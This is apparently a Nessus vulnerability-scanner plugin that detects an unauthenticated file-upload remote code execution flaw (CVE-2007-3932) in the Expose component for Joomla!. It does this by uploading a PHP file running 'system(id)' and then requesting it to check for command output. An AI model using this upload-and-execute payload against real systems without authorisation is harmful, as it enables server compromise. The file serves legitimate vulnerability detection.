#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25736);
  script_version("$Revision: 1.22 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2007-3932");
  script_bugtraq_id(24958);
  script_osvdb_id(41262);
  script_xref(name:"EDB-ID", value:"4194");

  script_name(english:"Expose for Joomla! File Upload RCE");
  script_summary(english:"Checks whether arbitrary file uploads are possible.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Expose component for Joomla!, a third-party component for Flash
galleries, running on the remote host is affected by a remote code
execution vulnerability within the com_expose/uploadimg.php script due
to improper sanitization or verification of uploaded files before
placing them in a user-accessible path. An unauthenticated, remote
attacker can exploit this issue, by uploading and then making a direct
request to a crafted file, to execute arbitrary PHP code on the remote
host, subject to the privileges of the web server user ID.");
  script_set_attribute(attribute:"see_also", value:"http://www.attrition.org/pipermail/vim/2007-July/001717.html");
  script_set_attribute(attribute:"solution", value:
"Apply the security patch according to the vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2007/07/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "Joomla!";
plugin = "Expose";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(qs:dir, port:port);
url = dir + "/administrator/components/com_expose/uploadimg.php";

# Make sure the affected script exists.
r = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
res = r[2];

# If it does...
if ('form method="post" action="uploadimg.php"' >< res)
{
  # Try to upload a file that will execute a command.
  cmd = "id";
  # nb: if safe checks are enabled, move_uploaded_file() will fail.
  if (safe_checks()) fname = "/";
  else fname = SCRIPT_NAME - ".nasl" + "-" + unixtime() + ".php";

  bound = "nessus";
  boundary = "--" + bound;
  postdata =
    boundary + '\r\n' +
    'Content-Disposition: form-data; name="userfile"; filename="' + fname +
    '"\r\n' +
    'Content-Type: application/octet-stream\r\n' +
    '\r\n' +
    '<?php system('+cmd+');  ?>\r\n' +
    boundary + '--\r\n';

  r = http_send_recv3(
    method  : "POST",
    item    : url,
    version : 11,
    data    : postdata,
    port    : port,
    add_headers : make_array("Content-Type", "multipart/form-data; boundary="+bound),
    exit_on_fail : TRUE
  );
  post_req = http_last_sent_request();
  res = r[2];

  # If safe checks are enabled...
  if (safe_checks())
  {
    # There's a problem if we get a message that the upload failed.
    if ("<script>alert('Error uploading')" >< res)
    {
      vuln = TRUE;
      report =
        "Nessus was not able to directly exploit this issue as safe checks" +
        '\nare enabled in the scan policy; however it does appear the '+app+
        '\ninstall at '+install_url+ ' is affected based on the reply from' +
        '\nthe following request :\n\n'+
        post_req +
        '\n\nThis produced the following response : \n\n' +
        strstr(res[2], "<script>alert('Error uploading')") + '\n';
      security_report_v4(port:port, severity:SECURITY_HOLE, extra:report);
      exit(0);
    }
  }
  else
  {
    pat = "File uploaded to \\.\\./\\.\\./\\.\\.(.+)"+fname;
    url2 = NULL;
    matches = egrep(pattern:pat, string:res);
    if (matches)
    {
      foreach match (split(matches))
      {
        match = chomp(match);
        url2 = eregmatch(pattern:pat, string:match);
        if (!empty_or_null(url2))
        {
          url2 = dir + url2[1] + fname;
          break;
        }
      }
    }
    if (isnull(url2))
      audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin+" component");

    # Now try to execute the script.
    r = http_send_recv3(method:"GET", item:url2, port:port, exit_on_fail:TRUE);
    res = r[2];

    # There's a problem if...
    if (
      # the output looks like it's from id or...
      egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res) ||
      # PHP's disable_functions prevents running system().
      egrep(pattern:"Warning.+\(\) has been disabled for security reasons", string:res)
    )
    {
      found = eregmatch(pattern:"(uid=[0-9]+.*gid=[0-9]+.*)", string:res);
      if (!empty_or_null(found)) output = found[1];
      else output = res;

      security_report_v4(
        port        : port,
        severity    : SECURITY_HOLE,
        cmd         : cmd,
        line_limit  : 2,
        request     : make_list(post_req, build_url(qs:url2, port:port)),
        output      : chomp(output),
        attach_type : 'text/plain'
      );
      exit(0);
    }
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
